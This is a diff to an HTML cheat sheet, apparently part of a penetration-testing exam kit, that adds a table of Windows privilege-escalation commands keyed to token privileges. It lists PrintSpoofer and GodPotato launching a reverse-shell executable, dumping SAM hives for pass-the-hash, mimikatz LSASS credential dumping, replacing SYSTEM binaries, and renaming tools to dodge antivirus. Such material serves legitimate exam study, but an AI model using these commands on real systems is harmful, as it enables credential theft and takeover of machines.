@@ -65,6 +65,11 @@
   .warn ul{margin:0;padding-left:18px}
   .warn li{margin:3px 0;font-size:13px}
   .warn b{color:var(--warn)}
+  .ttbl{width:100%;border-collapse:collapse;margin:0 0 10px;font-size:12.5px}
+  .ttbl th,.ttbl td{border:1px solid var(--border);padding:5px 8px;text-align:left;vertical-align:top}
+  .ttbl th{background:var(--surface-2);font-weight:600;color:var(--muted)}
+  .ttbl td:first-child{font-family:var(--mono);font-size:11.5px;color:var(--accent);white-space:nowrap}
+  .ttbl code{font-family:var(--mono);font-size:11.5px;background:var(--surface-2);padding:1px 4px;border-radius:4px}
   ol.reset{margin:0;padding-left:20px}
   ol.reset li{margin:4px 0;font-size:13px}
   ol.reset code{font-family:var(--mono);font-size:12px;background:var(--surface-2);padding:1px 5px;border-radius:4px}
@@ -134,9 +139,18 @@ Set <b>&lt;KALI&gt;</b> = your tun0 IP. Full detail: <b>exam-harness/USAGE.md</b
 <span class=cmd>find / -perm -4000 -type f 2>/dev/null<span class=c>    # SUID</span></span>
 <span class=cmd>getcap -r / 2>/dev/null ; cat /etc/crontab</span>
 <span class="cmd nop c"># Windows</span>
-<span class=cmd>whoami /priv<span class=c>   # SeImpersonate -> PrintSpoofer64 / GodPotato-NET4 (serve/windows)</span></span>
-<span class=cmd>.\PrintSpoofer64.exe -i -c cmd</span>
+<span class=cmd>whoami /priv<span class=c>   # read the NAMES, not Enabled/Disabled</span></span>
 </pre>
+<p class=note><b>whoami /priv → token attack</b> (service accts = IIS/MSSQL/LocalService usually have SeImpersonate). Tools in <code>serve/windows/</code>:</p>
+<table class=ttbl>
+<tr><th>Privilege</th><th>Attack → SYSTEM / hashes</th></tr>
+<tr><td>SeImpersonate<br>SeAssignPrimaryToken</td><td><code>PrintSpoofer64.exe -i -c cmd</code> → fail? <code>GodPotato-NET4.exe -cmd "C:\Windows\Temp\rev.exe"</code></td></tr>
+<tr><td>SeBackup / SeRestore</td><td><code>reg save hklm\sam sam.hive</code> + <code>...\system system.hive</code> → exfil → <code>impacket-secretsdump -sam sam.hive -system system.hive LOCAL</code> → PtH</td></tr>
+<tr><td>SeTakeOwnership</td><td><code>takeown /f &lt;tgt&gt;</code> → <code>icacls &lt;tgt&gt; /grant you:F</code> → replace a SYSTEM-loaded exe/DLL</td></tr>
+<tr><td>SeDebug</td><td>mimikatz <code>privilege::debug</code> → <code>sekurlsa::logonpasswords</code> (dump LSASS creds)</td></tr>
+<tr><td>SeLoadDriver / SeManageVolume</td><td>rare: vuln-driver load (kernel) / arbitrary write — recognize, don't chase</td></tr>
+</table>
+<p class=note><b>Gotchas:</b> "Disabled" is fine — the tool enables it. PrintSpoofer fails on 2019+/Win11 → GodPotato. Match <code>-NET4</code>/<code>-NET2</code> to installed .NET. AV eats the exe → rename / use kit build.</p>
 </div></section>
 
 <section><div class=head><span class=num>4·5</span><h2>PEAS triage — reading the output</h2><span class=tag>no AI needed</span></div>
